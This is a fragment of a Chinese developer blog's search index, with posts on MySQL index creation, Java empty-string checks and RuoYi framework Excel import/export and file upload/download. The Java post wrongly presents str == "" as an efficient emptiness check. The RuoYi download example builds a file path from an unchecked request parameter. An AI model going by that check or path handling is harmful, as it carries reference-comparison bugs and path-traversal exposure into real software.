","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:4:1","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"3.2、主键索引的创建与使用 前面聊到过，主键索引其实是一种特殊的唯一索引，但主键索引却并不是通过UNIQUE关键字创建的，而是通过PRIMARY关键字创建： -- 方式① ALTER TABLE tableName ADD PRIMARY KEY indexName(columnName); -- 方式② CREATE TABLE tableName( columnName1 INT(8) NOT NULL, columnName2 ...., ....., PRIMARY KEY [indexName] (columnName(length)) ); 复制代码 在这里要注意： 创建主键索引时，必须要将索引字段先设为主键，否则会抛1068错误码。 这里也不能使用CREATE语句创建索引，否则会提示1064语法错误。 同时创建索引时，关键字要换成KEY，并非INDEX，否则也会提示语法错误。 还是以之前的文章表为例，如下： -- 对非主键字段创建主键索引 ALTER TABLE zz_article ADD PRIMARY KEY i_special_column(special_column); -- 报错信息如下： 1068 - Multiple primary key defined -- 使用CREATE关键字创建主键索引 CREATE PRIMARY KEY i_article_id ON zz_article (article_id); -- 报错信息如下： 1064 - You have an error in your SQL syntax; check.... -- 使用INDEX关键字创建索引 ALTER TABLE zz_article ADD PRIMARY INDEX i_article_id(article_id); -- 报错信息如下： 1064 - You have an error in your SQL syntax; check.... -- 创建主键索引正确的方式 ALTER TABLE zz_article ADD PRIMARY KEY i_article_id(article_id); 复制代码 当然，一般主键索引都会在建表的DDL语句中创建，不会在表已经建立后再创建。 但似乎无论在讲普通索引，还是唯一索引、主键索引的时候，我们都没有讲如何使用这些创建好的索引查询数据，其实这一点无需咱们考虑，参考之前《SQL执行篇》中查询语句的执行流程，在一条SELECT语句来到MySQL时，会经历优化器优化的过程，而优化器则会自动帮咱们选择一个最合适的索引查询数据。当然，前提是查询条件中涉及到了索引字段才行。 前面也说过，你不想让优化器自动选择，也可以手动通过FORCE INDEX关键字强制指定。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:4:2","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"3.3、全文索引的创建与使用 全文索引和其他索引不同，首先如果你想要创建全文索引，那么MySQL版本必须要在5.7及以上，同时使用时也需要手动指定，一起来先看看如何创建全文索引，此时需要使用FULLTEXT关键字： -- 方式① ALTER TABLE tableName ADD FULLTEXT INDEX indexName(columnName); -- 方式② CREATE FULLTEXT INDEX indexName ON tableName(columnName); 复制代码 不过在创建全文索引时，有三个注意点： 5.6版本的MySQL中，存储引擎必须为MyISAM才能创建。 创建全文索引的字段，其类型必须要为CHAR、VARCHAR、TEXT等文本类型。 如果想要创建出的全文索引支持中文，需要在最后指定解析器：with parser ngram。 此时还依旧是以文章表为例，为文章名称字段创建一个全文索引，命令如下： ALTER TABLE zz_article ADD FULLTEXT INDEX ft_article_name(article_name) WITH PARSER NGRAM; 复制代码 创建好全文索引后，当你想要使用全文索引时，优化器这时不能自动选择，因为全文索引有自己的语法，但在了解如何使用之前，得先清楚两个概念：最小搜索长度和最大搜索长度，先来看看全文索引的一些参数，可通过show variables like '%ft%';命令查询，如下： 多余的参数就不介绍了，重点讲一下其中的几个重要参数： ft_min_word_len：使用MyISAM引擎的表中，全文索引最小搜索长度。 ft_max_word_len：使用MyISAM引擎的表中，全文索引最大搜索长度。 ft_query_expansion_limit：MyISAM中使用with query expansion搜索的最大匹配数。 innodb_ft_min_token_size：InnoDB引擎的表中，全文索引最小搜索长度。 innodb_ft_max_token_size：InnoDB引擎的表中，全文索引最大搜索长度。 那么究竟做最小搜索长度、最大搜索长度的作用是什么呢？其实这个是一个限制，对于长度小于最小搜索长度和大于最大搜索长度的词语，都无法触发全文索引。也就是说，如果想要使用全文索引对一个词语进行搜索，那这个词语的长度必须在这两个值之间。 其实这两个值自己可以手动调整的，最小值可以手动调整为1，MyISAM引擎的最大值可以调整为3600，但InnoDB引擎最大似乎就是84。 OK~，了解全文索引中的一些概念后，接下来看看如何使用全文索引，全文索引中有两个专门用于检索的关键字，即MATCH(column)、AGAINST(关键字)，同时这两个检索函数也支持三种搜索模式： 自然语言模式(默认搜索模式) 布尔搜索模式 查询拓展搜索 MATCH()主要是负责指定要搜索的列，这里要指定创建全文索引的字段，AGAINST()则指定要搜索的关键字，也就是要搜索的词语，接下来简单的讲一下三种搜索模式。 自然语言模式 这种模式也是在使用全文索引时，默认的搜索模式，使用方法如下： +------------+--------------------------+-------------------+ | article_id | article_name | special_column | +------------+--------------------------+-------------------+ | 1 | MySQL架构篇：....... | 《全解MySQL》 | | 2 | MySQL执行篇：....... | 《全解MySQL》 | | 3 | MySQL设计篇：....... | 《全解MySQL》 | | 4 | MySQL索引篇：....... | 《全解MySQL》 | +------------+--------------------------+-------------------+ SELECT COUNT(article_id) AS '搜索结果数量' FROM `zz_article` WHERE MATCH(article_name) AGAINST('MySQL'); -- 运行结果如下： +--------------+ | 搜索结果数量 | +--------------+ | 4 | +--------------+ 复制代码 一眼看过去，SQL就能看懂，毕竟都可以排版了一下SQL，不过多介绍了。唯一要注意的是，如果给定的关键词长度小于默认的最小搜索长度，那是无法使用全文索引的，比如","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:4:3","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"3.4、空间索引的创建与使用 空间索引这玩意儿实际上很多项目不会用到，我用的次数也不多，但如果你要用到这个索引，那可以通过SPATIAL关键字创建，如下： ALTER TABLE tableName ADD SPATIAL KEY indexName(columnName); 复制代码 但在创建空间索引的时候，有几个注意点需要牢记： 目前MySQL常用引擎中，仅有MyISAM支持空间索引，所以表引擎必须要为它。 空间索引必须要建立在类型为GEOMETRY、POINT、LINESTRING、POLYGON的字段上。 这个用的较少，就不展开细聊了~ ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:4:4","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["数据库"],"content":"3.5、联合索引的创建与使用 联合索引呢，实际上并不是一种逻辑索引分类，它是索引的一种特殊结构，前面给出的所有案例中，都仅仅是在单个字段的基础上建立索引，而联合索引的意思是可以使用多个字段建立索引。那该如何创建联合索引呢，不需要特殊的关键字，方法如下： CREATE INDEX indexName ON tableName (column1(length),column2...); ALTER TABLE tableName ADD INDEX indexName(column1(length),column2...); 复制代码 你可以使用INDEX关键字，让多个列组成一个普通联合索引 也可以使用UNIQUE INDEX关键字，让多个列组成一个唯一联合索引 甚至还可以使用FULLTEXT INDEX关键字，让多个列组成一个全文联合索引 ……. 但是前面也提过，SELECT语句的查询条件中，必须包含组成联合索引的第一个字段，此时才会触发联合索引，否则是无法使用联合索引的。 ","date":"2022-11-26","objectID":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/:4:5","tags":["索引使用"],"title":"索引初识:索引机制、分类、使用与管理","uri":"/posts/%E7%B4%A2%E5%BC%95%E5%88%9D%E8%AF%86%E7%B4%A2%E5%BC%95%E6%9C%BA%E5%88%B6%E5%88%86%E7%B1%BB%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"},{"categories":["Java后端"],"content":"思路：判断某字符串是否为空，为空的标准是str==null或str.length()==0 ","date":"2022-10-13","objectID":"/posts/java%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2string%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA/:0:0","tags":["java"],"title":"Java判断字符串String是否为空","uri":"/posts/java%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2string%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA/"},{"categories":["Java后端"],"content":"一.空字符串与null区别 1、类型 null表示的是一个对象的值，而并不是一个字符串。例如声明一个对象的引用，String a = null ; ““表示的是一个空字符串，也就是说它的长度为0。例如声明一个字符串String str = “” ; 2、内存分配 String str = null ; 表示声明一个字符串对象的引用，但指向为null，也就是说还没有指向任何的内存空间； String str = “”; 表示声明一个字符串类型的引用，其值为\"“空字符串，这个str引用指向的是空字符串的内存空间； 在java中变量和引用变量是存在栈中（stack），而对象（new产生的）都是存放在堆中（heap）： 就如下： String str = new String(“yuge”) ; =左边的是存放在栈中（stack），=右边是存放在堆中（heap） 3、字符串对象与null的值不相等，且内存地址也不相等； 空字符串对象与null的值不相等，且内存地址也不相等； new String()创建一个字符串对象的默认值为”” （String类型成员变量的初始值为null） ","date":"2022-10-13","objectID":"/posts/java%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2string%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA/:0:1","tags":["java"],"title":"Java判断字符串String是否为空","uri":"/posts/java%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2string%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA/"},{"categories":["Java后端"],"content":"二.Java判断字符串常见方法 方法一: 最多人使用的一个方法, 直观, 方便, 但效率很低: if(str == null || str .equals(\"\")); 方法二: 比较字符串长度, 效率高, 是我知道的最好一个方法: if(str == null || str .length() == 0); 方法三: Java SE 6.0 才开始提供的方法, 效率和方法二几乎相等, 但出于兼容性考虑, 推荐使用方法二. if(str == null || str .isEmpty()); 方法四: 这是一种比较直观,简便的方法,而且效率也非常的高,与方法二、三的效率差不多: if (str == null || str == \"\"); 注意:str == null 是有必要存在的. 如果 String 类型为null, 而去进行 equals(String) 或 length() 等操作会抛出java.lang.NullPointerException. 并且str ==null 的顺序必须出现在前面，不然同样会抛出java.lang.NullPointerException. ","date":"2022-10-13","objectID":"/posts/java%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2string%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA/:0:2","tags":["java"],"title":"Java判断字符串String是否为空","uri":"/posts/java%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2string%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA/"},{"categories":["Java后端"],"content":"三、StringUtils的isBlank与isEmply 1.public static boolean isEmpty(String str) 判断某字符串是否为空，为空的标准是 str==null 或 str.length()==0 2.public static boolean isNotEmpty(String str) 判断某字符串是否非空，等于 !isEmpty(String str) 3.public static boolean isBlank(String str) 判断某字符串是否为空或长度为0或由空白符(whitespace) 构成 4.public static boolean isNotBlank(String str) 判断某字符串是否不为空且长度不为0且不由空白符(whitespace) 构成，等于 !isBlank(String str) ","date":"2022-10-13","objectID":"/posts/java%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2string%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA/:0:3","tags":["java"],"title":"Java判断字符串String是否为空","uri":"/posts/java%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E4%B8%B2string%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA/"},{"categories":["Java后端","ruoyi"],"content":"RuoYi-Cloud是一款基于Spring Boot、Spring Cloud \u0026 Alibaba、Vue、Element的前后端分离微服务极速后台开发框架。 RuoYi 官网地址：http://ruoyi.vip(opens new window) RuoYi 在线文档：http://doc.ruoyi.vip(opens new window) RuoYi 源码下载：https://gitee.com/y_project/RuoYi-Cloud(opens new window) RuoYi 在线提问：https://gitee.com/y_project/RuoYi-Cloud/issues(opens new window) RuoYi 博客：https://www.oschina.net/p/ruoyi(opens new window) RuoYi-Cloud 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Spring Cloud \u0026 Alibaba、Vue、Element），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、代码生成等。在线定时任务配置；支持集群，支持多数据源。 ","date":"2022-10-05","objectID":"/posts/ruoyi/:0:0","tags":["ruoyi"],"title":"Ruoyi","uri":"/posts/ruoyi/"},{"categories":["Java后端","ruoyi"],"content":"导入导出 在实际开发中经常需要使用导入导出功能来加快数据的操作。在项目中可以使用注解来完成此项功能。 在需要被导入导出的实体类属性添加@Excel注解，目前支持参数如下： ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:1:0","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"#注解参数说明 参数 类型 默认值 描述 sort int Integer.MAX_VALUE 导出时在excel中排序，值越小越靠前 name String 空 导出到Excel中的名字 dateFormat String 空 日期格式, 如: yyyy-MM-dd readConverterExp String 空 读取内容转表达式 (如: 0=男,1=女,2=未知) separator String , 分隔符，读取字符串组内容 scale int -1 BigDecimal 精度 默认:-1(默认不开启BigDecimal格式化) roundingMode int BigDecimal.ROUND_HALF_EVEN BigDecimal 舍入规则 默认:BigDecimal.ROUND_HALF_EVEN celltype Enum Type.STRING 导出类型（0数字 1字符串 2图片） height String 14 导出时在excel中每个列的高度 单位为字符 width String 16 导出时在excel中每个列的宽 单位为字符 suffix String 空 文字后缀,如% 90 变成90% defaultValue String 空 当值为空时,字段的默认值 prompt String 空 提示信息 combo String Null 设置只能选择不能输入的列内容 headerBackgroundColor Enum IndexedColors.GREY_50_PERCENT 导出列头背景色IndexedColors.XXXX headerColor Enum IndexedColors.WHITE 导出列头字体颜色IndexedColors.XXXX backgroundColor Enum IndexedColors.WHITE 导出单元格背景色IndexedColors.XXXX color Enum IndexedColors.BLACK 导出单元格字体颜色IndexedColors.XXXX targetAttr String 空 另一个类中的属性名称,支持多级获取,以小数点隔开 isStatistics boolean false 是否自动统计数据,在最后追加一行统计数据总和 type Enum Type.ALL 字段类型（0：导出导入；1：仅导出；2：仅导入） align Enum HorizontalAlignment.CENTER 导出对齐方式HorizontalAlignment.XXXX handler Class ExcelHandlerAdapter.class 自定义数据处理器 args String[] {} 自定义数据处理器参数 ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:1:1","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"#导出实现流程 1、前端调用方法（参考如下） // 查询参数 queryParams queryParams: { pageNum: 1, pageSize: 10, userName: undefined }, /** 导出按钮操作 */ handleExport() { this.download('system/xxxx/export', { ...this.queryParams }, `post_${new Date().getTime()}.xlsx`) } 2、添加导出按钮事件 \u003cel-button type=\"warning\" icon=\"el-icon-download\" size=\"mini\" @click=\"handleExport\" \u003e导出\u003c/el-button\u003e 3、在实体变量上添加@Excel注解 @Excel(name = \"用户序号\", prompt = \"用户编号\") private Long userId; @Excel(name = \"用户名称\") private String userName; @Excel(name = \"用户性别\", readConverterExp = \"0=男,1=女,2=未知\") private String sex; @Excel(name = \"最后登陆时间\", width = 30, dateFormat = \"yyyy-MM-dd HH:mm:ss\") private Date loginDate; 4、在Controller添加导出方法 @Log(title = \"用户管理\", businessType = BusinessType.EXPORT) @PreAuthorize(hasPermi = \"system:user:export\") @PostMapping(\"/export\") public void export(HttpServletResponse response, SysUser user) throws IOException { List\u003cSysUser\u003e list = userService.selectUserList(user); ExcelUtil\u003cSysUser\u003e util = new ExcelUtil\u003cSysUser\u003e(SysUser.class); util.exportExcel(response, list, \"用户数据\"); } ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:1:2","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"#导入实现流程 1、前端调用方法（参考如下） import { getToken } from \"@/utils/auth\"; // 用户导入参数 upload: { // 是否显示弹出层（用户导入） open: false, // 弹出层标题（用户导入） title: \"\", // 是否禁用上传 isUploading: false, // 是否更新已经存在的用户数据 updateSupport: 0, // 设置上传的请求头部 headers: { Authorization: \"Bearer \" + getToken() }, // 上传的地址 url: process.env.VUE_APP_BASE_API + \"/system/user/importData\" }, // 导入模板接口importTemplate import { importTemplate } from \"@/api/system/user\"; /** 导入按钮操作 */ handleImport() { this.upload.title = \"用户导入\"; this.upload.open = true; }, /** 下载模板操作 */ importTemplate() { importTemplate().then(response =\u003e { this.download(response.msg); }); }, // 文件上传中处理 handleFileUploadProgress(event, file, fileList) { this.upload.isUploading = true; }, // 文件上传成功处理 handleFileSuccess(response, file, fileList) { this.upload.open = false; this.upload.isUploading = false; this.$refs.upload.clearFiles(); this.$alert(response.msg, \"导入结果\", { dangerouslyUseHTMLString: true }); this.getList(); }, // 提交上传文件 submitFileForm() { this.$refs.upload.submit(); } 2、添加导入按钮事件 \u003cel-button type=\"info\" icon=\"el-icon-upload2\" size=\"mini\" @click=\"handleImport\" \u003e导入\u003c/el-button\u003e 3、添加导入前端代码 \u003c!-- 用户导入对话框 --\u003e \u003cel-dialog :title=\"upload.title\" :visible.sync=\"upload.open\" width=\"400px\"\u003e \u003cel-upload ref=\"upload\" :limit=\"1\" accept=\".xlsx, .xls\" :headers=\"upload.headers\" :action=\"upload.url + '?updateSupport=' + upload.updateSupport\" :disabled=\"upload.isUploading\" :on-progress=\"handleFileUploadProgress\" :on-success=\"handleFileSuccess\" :auto-upload=\"false\" drag \u003e \u003ci class=\"el-icon-upload\"\u003e\u003c/i\u003e \u003cdiv class=\"el-upload__text\"\u003e 将文件拖到此处，或 \u003cem\u003e点击上传\u003c/em\u003e \u003c/div\u003e \u003cdiv class=\"el-upload__tip\" slot=\"tip\"\u003e \u003cel-checkbox v-model=\"upload.updateSupport\" /\u003e是否更新已经存在的用户数据 \u003cel-link type=\"info\" style=\"font-size:12px\" @click=\"importTemplate\"\u003e下载模板\u003c/el-link\u003e \u003c/div\u003e \u003cdiv class=\"el-upload__tip\" style=\"color:red\" slot=\"tip\"\u003e提示：仅允许导入“xls”或“xlsx”格式文件！\u003c/div\u003e \u003c/el-upload\u003e \u003cdiv slot=\"footer\" class=\"dialog-footer\"\u003e \u003cel-button type=\"primary\" @click=\"submitFileForm\"\u003e确 定\u003c/el-button\u003e \u003cel-button @cl","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:1:3","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"自定义标题信息 有时候我们希望导出表格包含标题信息，我们可以这样做。 导出用户管理表格新增标题（用户列表） public AjaxResult export(SysUser user) { List\u003cSysUser\u003e list = userService.selectUserList(user); ExcelUtil\u003cSysUser\u003e util = new ExcelUtil\u003cSysUser\u003e(SysUser.class); return util.exportExcel(list, \"用户数据\", \"用户列表\"); } 导入表格包含标题处理方式，其中1表示标题占用行数，根据实际情况填写。 public AjaxResult importData(MultipartFile file, boolean updateSupport) throws Exception { ExcelUtil\u003cSysUser\u003e util = new ExcelUtil\u003cSysUser\u003e(SysUser.class); List\u003cSysUser\u003e userList = util.importExcel(file.getInputStream(), 1); String operName = SecurityUtils.getUsername(); String message = userService.importUser(userList, updateSupport, operName); return AjaxResult.success(message); } ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:1:4","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"#自定义数据处理器 有时候我们希望数据展现为一个特殊的格式，或者需要对数据进行其它处理。Excel注解提供了自定义数据处理器以满足各种业务场景。而实现一个数据处理器也是非常简单的。如下： 1、在实体类用Excel注解handler属性指定自定义的数据处理器 public class User extends BaseEntity { @Excel(name = \"用户名称\", handler = MyDataHandler.class, args = { \"aaa\", \"bbb\" }) private String userName; } 2、编写数据处理器MyDataHandler继承ExcelHandlerAdapter，返回值为处理后的值。 public class MyDataHandler implements ExcelHandlerAdapter { @Override public Object format(Object value, String[] args) { // value 为单元格数据值 // args 为excel注解args参数组 return value; } } ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:1:5","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"#自定义隐藏属性列 有时候我们希望对列信息根据业务去动态显示，那么我们可以进行如下处理。 示例：对用户进行条件判断，符合条件则隐藏属性。导出的文件则不会显示此列信息。 @PostMapping(\"/export\") public void export(HttpServletResponse response, SysUser user) { List\u003cSysUser\u003e list = userService.selectUserList(user); ExcelUtil\u003cSysUser\u003e util = new ExcelUtil\u003cSysUser\u003e(SysUser.class); if (条件A) { // 不显示用户ID（单个） util.hideColumn(\"userId\"); } else if (条件B) { // 不显示用户名称、用户手机（多个） util.hideColumn(\"userId\", \"phonenumber\"); } util.exportExcel(response, list, \"用户数据\"); } ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:1:6","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"#导出对象的子列表 有时候对象里面还包含集合列表，例如用户管理包含多个角色需要导出，那么我们可以进行如下处理。 SysUser.java public class SysUser { @Excel(name = \"用户编号\", cellType = ColumnType.NUMERIC, width = 20, needMerge = true) private String userId; @Excel(name = \"用户名称\", width = 20, needMerge = true) private String userName; @Excel(name = \"邮箱\", width = 20, needMerge = true) private String email; @Excel(name = \"角色\") private List\u003cSysRole\u003e roles; public String getUserId() { return userId; } public void setUserId(String userId) { this.userId = userId; } public String getUserName() { return userName; } public void setUserName(String userName) { this.userName = userName; } public String getEmail() { return email; } public void setEmail(String email) { this.email = email; } public List\u003cSysRole\u003e getRoles() { return roles; } public void setRoles(List\u003cSysRole\u003e roles) { this.roles = roles; } } SysRole.java public class SysRole { @Excel(name = \"角色编号\", cellType = ColumnType.NUMERIC) private String roleId; @Excel(name = \"角色名称\") private String roleName; @Excel(name = \"角色字符\") private String roleKey; public String getRoleId() { return roleId; } public void setRoleId(String roleId) { this.roleId = roleId; } public String getRoleName() { return roleName; } public void setRoleName(String roleName) { this.roleName = roleName; } public String getRoleKey() { return roleKey; } public void setRoleKey(String roleKey) { this.roleKey = roleKey; } } 测试验证 public class Test { public static void main(String[] args) throws IOException { List\u003cSysUser\u003e userList = new ArrayList\u003cSysUser\u003e(); SysUser user1 = new SysUser(); List\u003cSysRole\u003e roles1 = new ArrayList\u003cSysRole\u003e(); SysRole role1 = new SysRole(); role1.setRoleId(\"1\"); role1.setRoleName(\"超级管理员\"); role1.setRoleKey(\"admin_key\"); SysRole role2 = new SysRole(); role2.setRoleId(\"2\"); role2.setRoleName(\"普通角色\"); role2.setRoleKey(\"common_key\"); SysRole role3 = new SysRole(); role3.setRoleId(\"3\"); role3.setRoleName(\"测试角色\"); role3.setRoleKey(\"test_key\"); SysRole role4 = new SysRole(); role4.setRoleId(\"4\"); role","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:1:7","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"#上传下载 首先创建一张上传文件的表，例如： drop table if exists sys_file_info; create table sys_file_info ( file_id int(11) not null auto_increment comment '文件id', file_name varchar(50) default '' comment '文件名称', file_path varchar(255) default '' comment '文件路径', primary key (file_id) ) engine=innodb auto_increment=1 default charset=utf8 comment = '文件信息表'; ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:2:0","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"#上传实现流程 1、代码生成sys_file_info表相关代码并复制到对应目录。 2、参考示例修改代码。 \u003cinput id=\"filePath\" name=\"filePath\" class=\"form-control\" type=\"file\"\u003e function submitHandler() { if ($.validate.form()) { uploadFile(); } } function uploadFile() { var formData = new FormData(); if ($('#filePath')[0].files[0] == null) { $.modal.alertWarning(\"请先选择文件路径\"); return false; } formData.append('fileName', $(\"#fileName\").val()); formData.append('file', $('#filePath')[0].files[0]); $.ajax({ url: prefix + \"/add\", type: 'post', cache: false, data: formData, processData: false, contentType: false, dataType: \"json\", success: function(result) { $.operate.successCallback(result); } }); } 3、在FileInfoController添加对应上传方法 @PostMapping(\"/add\") @ResponseBody public AjaxResult addSave(@RequestParam(\"file\") MultipartFile file, FileInfo fileInfo) throws IOException { // 上传文件路径 String filePath = RuoYiConfig.getUploadPath(); // 上传并返回新文件名称 String fileName = FileUploadUtils.upload(filePath, file); fileInfo.setFilePath(fileName); return toAjax(fileInfoService.insertFileInfo(fileInfo)); } 4、上传成功后需要预览可以对该属性格式化处理 { field : 'filePath', title: '文件预览', formatter: function(value, row, index) { return $.table.imageView(value); } }, 如需对文件格式控制，设置application.yml中的multipart属性 # 文件上传 servlet: multipart: # 单个文件大小 max-file-size: 10MB # 设置总上传的文件大小 max-request-size: 20MB 注意：如果只是单纯的上传一张图片没有其他参数可以使用通用方法 /common/upload 请求处理方法 com.ruoyi.web.controller.common.CommonController ","date":"2022-10-05","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:2:1","tags":["ruoyi"],"title":"Ruoyi框架之导入导出","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["Java后端","ruoyi"],"content":"#下载实现流程 1、参考示例代码。 function downloadFile(value){ window.location.href = ctx + \"common/download/resource?resource=\" + value; } 2、参考Controller下载方法 /** * 本地资源通用下载 */ @GetMapping(\"/common/download/resource\") public void resourceDownload(String resource, HttpServletRequest request, HttpServletResponse response) throws Exception { // 本地资源路径 String localPath = Global.getProfile(); // 数据库资源地址 String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX); // 下载名称 String downloadName = StringUtils.substringAfterLast(downloadPath, \"/\"); 